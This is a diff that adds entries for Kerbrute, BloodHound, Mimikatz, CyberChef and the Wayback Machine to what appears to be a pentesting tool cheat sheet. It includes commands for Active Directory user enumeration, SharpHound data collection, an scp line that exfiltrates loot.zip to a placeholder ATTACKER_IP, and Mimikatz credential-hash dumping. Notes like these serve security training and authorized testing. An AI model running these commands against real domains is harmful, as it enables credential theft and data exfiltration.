@@ -12,6 +12,11 @@
 * [Sherlock](#Sherlock)
 * [SpiderFoot](#SpiderFoot)
 * [CrackStation](#CrackStation)
+* [Kerbrute](#Kerbrute)
+* [BloodHound](#BloodHound)
+* [Mimikatz](#Mimikatz)
+* [CyberChef](#CyberChef)
+* [Wayback Machine](#Wayback-Machine)
 
 
 
@@ -279,5 +284,103 @@ $ firefox 127.0.0.1:5001
 **CrackStation** is a free password hash cracker.  
 It uses massive pre-computed lookup tables to crack password hashes.  
 These tables store a mapping between the hash of a password, and the correct password for that hash.
+
+
+
+# Kerbrute
+
+**Repository**: [ropnop/kerbrute](https://github.com/ropnop/kerbrute)  
+**Releases**: [kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
+
+A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.
+
+### Basic Usage
+
+```
+# Downloading
+$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386
+
+# Enum Users
+$ ./kerbrute_linux_386 userenum --dc {TAGET} -d {DNS} {USERS_FILE}
+```
+
+
+
+# BloodHound
+
+**Repository**: [BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+It uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment.
+
+### Basic Usage
+
+Generate and save loot.zip in Windows target machine
+```
+# Init SharpHound
+PS C:\Users\Administrator\Documents> . .\SharpHound.ps1
+
+# Generate loot.zip
+PS C:\Users\Administrator\Documents> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+
+# Exfiltrating loot.zip file
+PS C:\Users\Administrator\Documents> scp .\20210425092207_loot.zip {ATTACKER}@{ATTACKER_IP}:{PATH}
+```
+
+Rising BloodHound
+```
+# Install
+sudo apt-get install neo4j bloodhound
+
+# Init
+$ sudo neo4j console
+
+# Access WEB Page and change default password
+# Default User: neo4j
+# Default Pass: neo4j
+$ firefox http://localhost:7474/
+
+# Start
+$ bloodhound
+
+# Now import the loot.zip file into bloodhound UI
+```
+
+
+
+# Mimikatz
+
+**Repository**: [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
+
+This is a tool to make somes experiments with Windows security.
+
+### Basic Usage
+
+```
+# Init
+PS C:\Users\Administrator\Documents> . .\mimikatz.exe
+
+# Need to run as Administrator
+$ privilege::debug 
+Privilege '20' OK
+
+# Dump Hashes
+$ lsadump::lsa /patch
+```
+
+
+
+# CyberChef
+
+**WebSite**: [CyberChef](https://gchq.github.io/CyberChef/)
+
+Vesatile online endocing/secoding tool.
+
+
+
+# Wayback Machine
+
+**WebSite**: [archive.org](https://archive.org/web/)
+
+Websites timeline.
 
 ________________________
